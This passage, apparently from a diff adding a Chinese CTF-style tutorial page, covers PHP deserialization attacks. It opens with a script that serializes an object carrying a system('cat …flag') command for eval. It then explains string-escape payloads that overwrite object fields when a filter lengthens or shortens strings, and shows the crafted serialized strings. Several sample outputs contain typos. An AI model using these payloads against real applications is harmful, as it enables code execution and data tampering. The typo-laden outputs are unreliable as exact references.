+</span></span><span class="line"><span class="cl">        <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">flag</span> <span class="o">=</span> <span class="n">new</span> <span class="n">test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">flag</span><span class="o">-&gt;</span><span class="n">b</span> <span class="o">=</span> <span class="o">&amp;$</span><span class="n">flag</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">flag</span><span class="o">-&gt;</span><span class="n">c</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;cat /fffffffffflagafag&#39;);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">flag</span><span class="p">));</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="直接去掉最后一个括号" class="heading-element"><span>直接去掉最后一个括号</span>
+  <a href="#%e7%9b%b4%e6%8e%a5%e5%8e%bb%e6%8e%89%e6%9c%80%e5%90%8e%e4%b8%80%e4%b8%aa%e6%8b%ac%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><blockquote>
+<p>原理是出现这个序列化字符串报错导致直接触发__destruct</p>
+</blockquote>
+<h3 id="php反序列化字符逃逸" class="heading-element"><span>PHP反序列化字符逃逸</span>
+  <a href="#php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="逃逸原理" class="heading-element"><span>逃逸原理</span>
+  <a href="#%e9%80%83%e9%80%b8%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>反序列化时，是以<code>}</code>来进行结尾的，同时在字符串内，是以关键字后面的数字来规定所读取的内容的长度。</p>
+<h4 id="过滤后字符变多" class="heading-element"><span>过滤后字符变多</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e5%90%8e%e5%ad%97%e7%ac%a6%e5%8f%98%e5%a4%9a" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><blockquote>
+<p>原理是出现这个序列化字符串报错导致直接触发__destruct</p>
+</blockquote>
+<p>正常反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class A{
+</span></span><span class="line"><span class="cl">	public $a=&#39;qqqqqqq&#39;;
+</span></span><span class="line"><span class="cl">	public $b=&#39;21&#39;;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">function filter($a){
+</span></span><span class="line"><span class="cl">	$filter=&#39;/q/i&#39;;
+</span></span><span class="line"><span class="cl">	return preg_replace($filter,&#39;ww&#39;,$a);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$a=new A;
+</span></span><span class="line"><span class="cl">echo serialize($a);</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">string(45)&#34;O:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:1:&#34;q&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="关键函数" class="heading-element"><span>关键函数</span>
+  <a href="#%e5%85%b3%e9%94%ae%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>【将序列化后的值，将所有的<code>'q'</code>变为<code>'ww'</code>】</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function filter($a){
+</span></span><span class="line"><span class="cl">    $filter=&#39;/q/i&#39;;
+</span></span><span class="line"><span class="cl">    return preg_replace($filter,&#39;ww&#39;,$a);
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="目的" class="heading-element"><span>目的</span>
+  <a href="#%e7%9b%ae%e7%9a%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>要将反序列后<code>$b</code>的值变为我们想要的值。</p>
+<p>带过滤的源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class A{
+</span></span><span class="line"><span class="cl">	public $a=&#39;qqqqqqq&#39;;
+</span></span><span class="line"><span class="cl">	public $b=&#39;21&#39;;
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">	function filter($a){
+</span></span><span class="line"><span class="cl">        $filter=&#39;/q/i&#39;;
+</span></span><span class="line"><span class="cl">        return preg_replace($filter,&#39;ww&#39;,$a);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$a=new A;
+</span></span><span class="line"><span class="cl">echo serialize($a));
+</span></span><span class="line"><span class="cl">echo&#39;&lt;pre&gt;&#39;;
+</span></span><span class="line"><span class="cl">$r=filter(serialize($a));
+</span></span><span class="line"><span class="cl">echo $r;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:1:&#34;A&#34;:2:{s:1:&#34;a&#34;s:7:&#34;qqqqqqa&#34;;s:1:&#34;b&#34;s:2:&#34;21&#34;;}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:7:&#34;wwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>假设我们想要<code>$b=104</code>，构造的<code>$b</code>的值的序列化后为:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>&quot;;</code>是用来闭合的</p>
+<h5 id="逃逸方法" class="heading-element"><span>逃逸方法</span>
+  <a href="#%e9%80%83%e9%80%b8%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>如果直接等于<code>&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;}</code>的结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0:1:&#34;A&#34;:2{s:1:&#34;a&#34;s:28:&#34;qqqqqqq&#34;s:1:&#34;b&#34;s3:&#34;104&#34;;}&#34;s:1:&#34;b&#34;s:2:&#34;21&#34;;}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:1:&#34;A&#34;:2{s:1:&#34;a&#34;;s:28:&#34;wwwwwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果我们把<code>s:28</code>后面的内容以字符串按要求填满了28个，那么s:1:&ldquo;b&rdquo;;s:3:&ldquo;104&rdquo;;}就会被包含在序列化字符串内。</p>
+<p>而<code>}”</code>后面的内容，即<code>;s:1:&quot;b&quot;;s:2:&quot;21&quot;;}&quot;</code>就不会被认为是序列化字符串的内容，从而执行了我们构造的&quot;<code>;s:1:&quot;b&quot;;s:3:&quot;104&quot;;}</code>，即让一个成员<code>b</code>的值为<code>104</code>。</p>
+<p>构造：在上面，只要让<code>'w'</code>字符的数量按要求达到s:后面所要求的的数量（28）即可。</p>
+<p>在<code>filter</code>函数中，一个<code>q</code>被换成了两个<code>w</code>，所以让<code>q</code>的数量等于<code>&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;}</code>的字符串长度就行了。因为<code>&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;}</code>的字符串长度为21，让<code>q</code>的数量为21，反序列化后<code>A</code>的值的长度为就是<strong>q的数量加上<code>&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;}</code></strong>  的长度（42），在<code>filter()</code>之后，<code>w</code>的数量就是刚好42，而我们<strong>添加上去的字符串就会被逃逸出来，会在反序列化的时候成功执行</strong>。</p>
+<p>最终</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;qqqqqqqqqqqqqqqqqqqqq&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">b</span><span class="o">=</span><span class="s1">&#39;21&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">function</span> <span class="n">filter</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">filter</span><span class="o">=</span><span class="s1">&#39;/q/i&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">preg_replace</span><span class="p">(</span><span class="o">$</span><span class="n">filter</span><span class="p">,</span><span class="s1">&#39;ww&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">a</span><span class="o">=</span><span class="n">new</span> <span class="n">A</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span><span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">r</span><span class="o">=</span><span class="n">filter</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="o">$</span><span class="n">r</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">string(87) &#34;O:1:&#34;A&#34;:2:{s:1:&#34;a&#34;;s:42:&#34;qqqqqqqqqqqqqqqqqqqqq&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;
+</span></span><span class="line"><span class="cl">string(108) &#34;O:1:&#34;A&#34;:2:{s:1:&#34;a&#34;;s:42:&#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#34;;s:1:&#34;b&#34;;s:3:&#34;104&#34;;}&#34;;s:1:&#34;b&#34;;s:2:&#34;21&#34;;}&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后再进行反序列化就可以发现，$b的值变成了104。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(unserialize($r));</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>综述：</strong>
+让字符&rsquo;w&rsquo;占用了原本属于&quot;;s:1:&ldquo;b&rdquo;;s:3:&ldquo;104&rdquo;}的位置，从而让&quot;;s:1:&ldquo;b&rdquo;;s:3:&ldquo;104&rdquo;}逃逸出去而成功执行。</p>
+<h4 id="过滤后字符变少" class="heading-element"><span>过滤后字符变少</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e5%90%8e%e5%ad%97%e7%ac%a6%e5%8f%98%e5%b0%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function str_rep($string){
+</span></span><span class="line"><span class="cl">    return preg_replace( &#39;/php|test/&#39;,&#39;&#39;, $string);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$test[&#39;name&#39;] = $_GET[&#39;name&#39;];
+</span></span><span class="line"><span class="cl">$test[&#39;sign&#39;] = $_GET[&#39;sign&#39;]; 
+</span></span><span class="line"><span class="cl">$test[&#39;number&#39;] = &#39;2020&#39;;
+</span></span><span class="line"><span class="cl">$temp = str_rep(serialize($test));
+</span></span><span class="line"><span class="cl">printf($temp);
+</span></span><span class="line"><span class="cl">$fake = unserialize($temp);
+</span></span><span class="line"><span class="cl">echo &#39;&lt;br&gt;&#39;;
+</span></span><span class="line"><span class="cl">print(&#34;name:&#34;.$fake[&#39;name&#39;].&#39;&lt;pr&gt;&#39;);
+</span></span><span class="line"><span class="cl">print(&#34;sign:&#34;.$fake[&#39;sign&#39;].&#39;&lt;pr&gt;&#39;);
+</span></span><span class="line"><span class="cl">print(&#34;number:&#34;.$fake[&#39;number&#39;].&#39;&lt;pr&gt;&#39;);
+</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码是接收了参数name和sign，且number是固定的</p>
+<p>经过了序列化=&gt;正则匹配替换字符串减少=&gt;反序列化的过程后输出结果</p>
+<p>我们的目的就是通过控制传参name和sign，间接改变number</p>
+<h5 id="逃逸方法-1" class="heading-element"><span>逃逸方法</span>
+  <a href="#%e9%80%83%e9%80%b8%e6%96%b9%e6%b3%95-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>sign中传<code>&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;}</code>无法使用</p>
+<p>由于sign的字符串个数为27，所以后面的<code>&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;}</code>的payload被当作了字符串sign的值，而没有被当作序列化语句去反序列化</p>
+<p>因此需要过滤函数了给我们实现字符逃逸</p>
+<p>我们需要的payload雏形：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a:3:{s:4:&#34;name&#34;;s:24:&#34;&#34;;s:4:&#34;sign&#34;;s:54:&#34;hello&#34;;s:4:&#34;sign&#34;;s:4:&#34;eval&#34;;s:6:&#34;number&#34;;s:4:&#34;2000&#34;;}&#34;;s:6:&#34;number&#34;;s:4:&#34;2020&#34;;}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要放入的test的个数有24个字符串（也就是name的值）</p>
+<h4 id="字符串逃逸综述" class="heading-element"><span>字符串逃逸综述</span>
+  <a href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%83%e9%80%b8%e7%bb%bc%e8%bf%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ol>
+<li>
+<p>字符串增加：</p>
+<p>构造的序列化加在qqqq（就是值有很多qqqq的）那个变量里。字符串减少：构造的序列化加在另一个变量里。</p>
+<ul>
+<li>构造的序列化语句和过滤的值在同一个变量</li>
+<li>构造过滤的值的个数就是构造的序列化语句的字符串个数</li>
+</ul>
+</li>
+<li>
+<p>字符串减少：</p>
+<p>字符串<code>'qqqqxxx'</code>的数量依照构造的那个序列化字符串的长度。字符串减少：字符串<code>'qqqqxxx'</code>的数量依照<code>O:1:&quot;A&quot;:2{s:1:&quot;a&quot;;s:44:&quot;wwwwwwwwwwwwwwwwwwwwww&quot;;s:1:&quot;b&quot;;s:22:&quot;A&quot;;s:1:&quot;b&quot;;s:3:&quot;104&quot;;}&quot;;}</code>中替换部分的长度。</p>
+<ul>
+<li>构造的序列化语句和过滤的值不在同个变量里</li>
+<li>构造过滤的值是name的值的个数</li>
+</ul>
+</li>
+</ol>
